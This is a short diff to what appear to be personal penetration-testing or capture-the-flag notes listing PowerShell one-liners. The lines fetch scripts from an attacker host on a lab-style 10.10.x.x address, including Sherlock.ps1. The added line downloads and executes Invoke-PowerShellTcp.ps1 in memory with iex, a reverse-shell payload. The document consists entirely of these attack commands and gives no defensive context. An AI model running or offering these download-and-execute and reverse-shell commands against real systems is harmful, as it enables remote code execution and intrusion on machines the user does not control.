@@ -5,3 +5,7 @@ powershell.exe “IEX(New-Object Net.WebClient).downloadString(‘http://10.10.1
 way 2 ==> better
 
 powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/Sherlock.ps1', 'sherloack.ps1')
+
+way 3 ==> download and execute
+
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
